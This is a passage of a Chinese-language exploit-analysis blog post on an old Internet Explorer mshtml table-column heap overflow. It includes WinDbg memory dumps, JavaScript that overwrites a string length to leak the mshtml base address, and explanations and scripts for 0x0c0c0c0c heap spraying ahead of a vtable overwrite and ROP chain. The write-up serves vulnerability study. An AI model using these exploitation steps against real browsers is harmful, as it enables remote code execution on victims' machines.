edx=00000009 esi=030c110c edi=004a8e80</span><br><span class=\"line\">eip=6872a6cb esp=0254bfbc ebp=0254c064 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CTableCol::GetAAspan:</span><br><span class=\"line\">6872a6cb 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; gu</span><br><span class=\"line\">eax=00000009 ebx=004dee40 ecx=00000002 edx=004cbf88 esi=030c110c edi=004a8e80</span><br><span class=\"line\">eip=6893f31f esp=0254bfc0 ebp=0254c064 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x3ac:</span><br><span class=\"line\">6893f31f 3de8030000      cmp     eax,3E8h</span><br><span class=\"line\">0:005&gt; dd 030c110c L300</span><br><span class=\"line\">030c110c  00000045 2baf3432 88000000 000000fa</span><br><span class=\"line\">030c111c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c112c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c113c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c114c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c115c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c116c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c117c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c118c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c119c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11ac  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11bc  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11cc  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11dc  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11ec  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11fc  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c120c  00410041 00410041 00000041 2baf3453</span><br><span class=\"line\">030c121c  88000000 000000fa 00420042 00420042 # 0xfa为字符串size</span><br><span class=\"line\">030c122c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c123c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c124c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c125c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c126c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c127c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c128c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c129c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12ac  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12bc  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12cc  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12dc  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12ec  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12fc  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c130c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c131c  00000042 2baf3474 8c000000 687f84f8</span><br><span class=\"line\">030c132c  0049ca00 030bce00 687f8690 00000001 # 这里0x687f8690是需要leak的地址</span><br><span class=\"line\">030c133c  00000000 01080809 ffffffff 00000000</span><br><span class=\"line\">030c134c  00000000 00000000 ffffffff 00000080</span><br><span class=\"line\">030c135c  ffffffff 00000000 00000000 00000000</span><br><span class=\"line\">030c136c  00000000 00000000 00000024 00000020</span><br><span class=\"line\">030c137c  00000000 00000000 00000000 00000000</span><br><span class=\"line\">030c138c  00000000 00000000 00000000 00000000</span><br><span class=\"line\">030c139c  00000000 00000000 00000000 00000000</span><br><span class=\"line\">030c13ac  00000000 00000000 00000000 00000000</span><br><span class=\"line\"></span><br><span class=\"line\">0:005&gt; ln 687f8690 </span><br><span class=\"line\">(687f8690)   mshtml!CButtonLayout::`vftable&apos;   |  (687f8738)   mshtml!CObjectImageLayout::`vftable&apos;</span><br><span class=\"line\">Exact matches:</span><br><span class=\"line\">    mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure>\n<p>需要利用堆溢出，通过js代码动态更新span属性值来达到目的。每一个都会写入一串0x1c的样式，所以要修改size的话需要<code>0x30c121c - 0x30c110c / 0x1c = 9 + 1 = 10</code>，再将span增加10，即修改span为19。写完后，字符串B的长度由0x000000fa变成了0x00010048，因此该对象能访问的内存空间变广了，这样我们就能通过如下代码获取到CButtonLayout对象的vftable值，最计算得到mshtml.dll模块的基址。</p>\n<p>此段exp如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">leak</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> leak_col = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"132\"</span>);</span><br><span class=\"line\">  leak_col.width = <span class=\"string\">\"41\"</span>;</span><br><span class=\"line\">  leak_col.span = <span class=\"string\">\"19\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;leak(), <span class=\"number\">400</span>&#125;);</span><br></pre></td></tr></table></figure>\n<p>然后获取模型基址的exp如下</p>\n<p><strong>注：这里的bl[498]稍微令人有些费解，不过可以通过在exp中判断每个字符串的size是否被修改过从而定位到溢出的BSTR对象，类似漏洞战争一书中的exp</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//计算mshtml模块基址，并通过堆喷进行rop和shellcode布局</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_leak</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> str_addr = strtoint(bl[<span class=\"number\">498</span>].substring((<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>+<span class=\"number\">11</span>,(<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>+<span class=\"number\">13</span>));</span><br><span class=\"line\">    str_addr = str_addr - <span class=\"number\">1410704</span>;</span><br><span class=\"line\">    <span class=\"comment\">//setTimeout(function()&#123;heapspray(str_addr)&#125;, 50);</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中红色位置，字符串长度被修改为0x10048，就可以溢出得到蓝色位置的值。</p>\n<h4 id=\"Heap-Spray\"><a href=\"#Heap-Spray\" class=\"headerlink\" title=\"Heap Spray\"></a>Heap Spray</h4><p>在得到mshtml.dll模块的基址后，我们就有机会构造相应的ROP链来实现想要的功能了，那么现在需要解决另外一个问题，也就是如何让程序跳转到我们的ROP链执行。<strong>此exp首先会利用堆喷技术将ROP链中的gadget地址和参数以及后面用到的shellcode布局到进程地址空间中的固定位置，而后再利用堆溢出重写CButtonLayout对象的虚表指针，使其指向前面提到的固定位置，这样当虚函数被调用时就会跳转到我们的ROP链中。</strong></p>\n<p>将原先的width属性值设置为127888，那么样式值为<strong>127888*0x100=0x079f6da0</strong>，也就是可以把虚表指针覆盖为0x79f6da0，那么只要能通过堆喷将rop链的地址控制到这个地址即可。其实这个地址是事先计算出来的，下面会讲到。</p>\n<p>P.S.：一些Windbg堆调试技巧如下：</p>\n<blockquote>\n<p>Windbg调试堆：</p>\n<p>!heap -stat显示被调试进程的所有堆使用情况</p>\n<p>!heap -a xxxxxxxx 显示关于xxxxxxxx处堆的详细情况，输出会有些多</p>\n<p>!heap -stat -h xxxxxxxx 查看xxxxxxxx堆的分配统计数据</p>\n<p>!heap -flt s 7ffe0 查看大小为7ffe0的内存，在堆喷的时候可以方便的找到payload所在的地址</p>\n<p>0:007&gt; !<strong>heap</strong> <strong>-flt</strong> <strong>s</strong> 7<strong>ffe0</strong><br> _<strong>HEAP</strong> @ 140000<br>   HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state                 // 这里HEAP_ENTRY是堆的头部，UserPtr是BSTR对象头部<br>     02240018 fffc 0000  [0b]   02240020    7ffe0 - (busy VirtualAlloc)<br>     01fe0018 fffc fffc  [0b]   01fe0020    7ffe0 - (busy VirtualAlloc)<br>     022c0018 fffc fffc  [0b]   022c0020    7ffe0 - (busy VirtualAlloc)<br>     02340018 fffc fffc  [0b]   02340020    7ffe0 - (busy VirtualAlloc)<br>…<br>…</p>\n<p>0:007&gt; <strong>dd</strong> 02240018<br>02240018  00000020 00000<strong>b00</strong> 0007<strong>ffd4</strong> 90909090<br>02240028  90909090 90909090 90909090 90909090<br>02240038  90909090 90909090 90909090 90909090</p>\n<p>!heap -p -a 0x0c0c0c0c查看0x0c0c0c0c处的数据属于哪个堆:</p>\n</blockquote>\n<hr>\n<p><strong>堆喷射内存布局</strong></p>\n<p>在浏览器中分配的字符串都会被转换为unicode，所以为了准确传递字符，我们需要使用JavaScript中的unescape函数，这个函数用于解码字符串，所以用已经是unicode的字符串，在内存中就不会再次被转换为unicode了，用%u加在每两字节之前，注意两字节要反序排列。分配字符串后会变成BSTR字符串对象，含有4字节的头信息和两个NULL字节的结尾。</p>\n<p>一般的堆喷射内存布局就是大量的nop指令(也称为滑板指令)加上shellcode，shellcode放在每个块的尾部，只要保证喷射堆块足够大，那么预测的地址处就会是nop指令，然后执行到shellcode。</p>\n<p>在堆喷中最著名的地址要数<strong>0x0c0c0c0c</strong>了，解释一下为什么使用这个地址。如果在Exploit中通过覆盖堆栈中的虚表的话，使用这个地址就会十分合适，当虚函数被调用时，先取得栈中的对象指针，通过对象指针取得虚表指针，然后在虚表内适当偏移处取得函数指针执行，示意图:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> Stack</span><br><span class=\"line\">+---------+          Object</span><br><span class=\"line\">| obj_ptr | ----&gt;  +--------+        Vtable</span><br><span class=\"line\">+---------+        |p_Vtable| ---&gt; +-------+</span><br><span class=\"line\">|         |        +--------+      |p_func1| ----&gt; func1</span><br><span class=\"line\">+---------+        |        |      +-------+</span><br><span class=\"line\">|         |        +--------+</span><br><span class=\"line\">+---------+</span><br></pre></td></tr></table></figure>\n<p>假如将obj_ptr覆盖为0x0c0c0c0c，将0x0c0c0c0c地址内的内容填为x0cx0cx0cx0c，那么顺着这条调用链，最后还是会调用0x0c0c0c0c地址处的指令，而且:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004010A0  0C 0C   OR AL,0C</span><br><span class=\"line\">004010A2  0C 0C   OR AL,0C</span><br></pre></td></tr></table></figure>\n<p>计算需要多大的内存块才能喷到0x0c0c0c0c</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0c0c0c0c = 202116108</span><br><span class=\"line\">202116108字节(b)=192.7529411兆字节(mb)</span><br></pre></td></tr></table></figure>\n<p>但由于分配的起始地址并不是从零开始，所以实际中并不需要那么大的内存，<strong>还有一个要注意的点就是unescape返回的对象在用.length计算长度时返回的是实际长度的一半</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; s = <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u4142%u4344%u4546\"</span>)</span><br><span class=\"line\">&gt; s.length</span><br><span class=\"line\"><span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n<p>一份堆喷射的脚本可能看起来像这样：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">    tag = <span class=\"built_in\">unescape</span>(<span class=\"string\">'%u4141%u4141'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    chunk = <span class=\"string\">''</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">    chunksize = 0x1000;</span></span><br><span class=\"line\"><span class=\"undefined\">    nr_of_chunks = 200;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">for</span> (counter = <span class=\"number\">0</span>; counter &lt; chunksize; counter++) &#123; <span class=\"comment\">// 填充0x1000的NOP指令</span></span></span><br><span class=\"line\"><span class=\"javascript\">        chunk += <span class=\"built_in\">unescape</span>(<span class=\"string\">'%u9090%u9090'</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    chunk = chunk.substring(0, chunksize - tag.length);</span></span><br><span class=\"line\"><span class=\"javascript\">    testarray = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">for</span> (counter = <span class=\"number\">0</span>; counter &lt; nr_of_chunks; counter++) &#123; <span class=\"comment\">// 0x200个chunk</span></span></span><br><span class=\"line\"><span class=\"undefined\">        testarray[counter] = tag + chunk;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>XP下IE6和IE7的堆喷</strong></p>\n<p>可以用IE Collection安装多个版本的IE，这里在XP SP3上安装了IE6和IE7用于调试。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> shellcode = <span class=\"built_in\">unescape</span>(<span class=\"string\">'%u4141%u4141'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> bigblock = <span class=\"built_in\">unescape</span>(<span class=\"string\">'%u9090%u9090'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> headsize = <span class=\"number\">20</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> slackspace = headsize + shellcode.length;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">while</span> (bigblock.length &lt; slackspace) bigblock += bigblock;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> fillblock = bigblock.substring(<span class=\"number\">0</span>, slackspace);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> block = bigblock.substring(<span class=\"number\">0</span>, bigblock.length - slackspace);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">while</span> (block.length + slackspace &lt; <span class=\"number\">0x40000</span>) block = block + block + fillblock;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> memory = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">500</span>; i++) &#123;memory[i] = block + shellcode;&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>分配了500块大小为0x40000 * 2的内存块(.length返回大小为实际大小一半)，结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:009&gt; dd 0c0c0c0c</span><br><span class=\"line\">0c0c0c0c  90909090 90909090 90909090 90909090</span><br><span class=\"line\">0c0c0c1c  90909090 90909090 90909090 90909090</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>可以尝试多次，发现都是成功的，查看堆的状态：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:009&gt; !heap -stat -h 00140000</span><br><span class=\"line\"> heap @ 00140000</span><br><span class=\"line\">group-by: TOTSIZE max-display: 20</span><br><span class=\"line\">    size     #blocks     total     ( %) (percent of total busy bytes)</span><br><span class=\"line\">    7ffe0 1f5 - fa7c160  (99.78)</span><br><span class=\"line\">    8000 1 - 8000  (0.01)</span><br><span class=\"line\">    7fe0 1 - 7fe0  (0.01)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>基本上块的大小都是0x7ffe0，也就是所分配的0x40000 * 2。</p>\n<hr>\n<p>回到我们的exp，由于堆空间管理的<strong>对齐</strong>（类似Glibc的对齐）和彼此相邻的性质，分配的堆空间将类似下面这个样子：</p>\n<p><img src=\"https://images.seebug.org/content/images/2017/01/10.png-w331s\" alt=\"img\"></p>\n<p>这一块参考如下文章（<a href=\"http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html）：\" target=\"_blank\" rel=\"noopener\">http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html）：</a></p>\n<p><img src=\"http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png\" alt=\"img\"></p>\n<blockquote>\n<p>有一种方法允许你可靠地分配shellcode，使得它既处在可预测的位置，又和内存页面对齐（64K对齐）。为什么要64K对齐？因为堆页地址的十六进制末尾4位为0000。因此，任何javascript字符串将是6个字节长加上Unicode编码字符串的长度。此外，使用VirtualAlloc分配的堆块长度为0x20字节。因此，通过VirtualAlloc分配的shellcode将始终位于偏移0x24处。另外，由于每个分配产生一个64K对齐的地址，我们可以进行一系列完全等于64K的字符串分配。这样，我们的shellcode开头将始终位于类似（0xXXXX0024）的地址。</p>\n<p>以下Javascript代码分配16个64K字符串（即1MB）的数组。注意，第16个分配考虑了堆头和字符串长度，因此只分配了一兆字节。然后将得到的数组分配一百次，从而精确分配100MB。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">heapspray</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">var</span> shellcode = <span class=\"string\">\"u\\4141\"</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">while</span> (shellcode.length &lt; <span class=\"number\">100000</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">&gt;  shellcode = shellcode + shellcode;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">var</span> onemeg = shellcode.substr(<span class=\"number\">0</span>, <span class=\"number\">64</span>*<span class=\"number\">1024</span>/<span class=\"number\">2</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">14</span>; i++) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt;  onemeg += shellcode.substr(0, 64*1024/2);</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"undefined\">&gt; onemeg += shellcode.substr(0, (64*1024/2)-(38/2));</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">var</span> spray = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">100</span>; i++) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt;  spray[i] = onemeg.substr(0, onemeg.length);</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Spray the heap\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"heapspray()\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>然后运行Windbg调试：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; !heap -stat</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; _HEAP 00360000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00100000</span><br><span class=\"line\">&gt;       Committed bytes 000f1000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000001</span><br><span class=\"line\">&gt;       VirtAlloc bytes 035f0000</span><br><span class=\"line\">&gt; _HEAP 035b0000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00040000</span><br><span class=\"line\">&gt;       Committed bytes 00019000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt; _HEAP 00750000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00040000</span><br><span class=\"line\">&gt;       Committed bytes 00012000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt; _HEAP 00270000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00010000</span><br><span class=\"line\">&gt;       Committed bytes 00010000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt; _HEAP 02e20000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00040000</span><br><span class=\"line\">&gt;       Committed bytes 00001000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt; _HEAP 00010000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00010000</span><br><span class=\"line\">&gt;       Committed bytes 00001000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>查看VirtAlloc bytes 字段很大的分配，第一个地址就是我们所感兴趣的堆地址_HEAP 00360000</p>\n<p>然后，查看堆句柄的分配统计</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; !heap -stat -h 00360000</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; heap @ 00360000</span><br><span class=\"line\">&gt; group-by: TOTSIZE max-display: 20</span><br><span class=\"line\">&gt;  size     #blocks     total     ( %) (percent of total busy bytes)</span><br><span 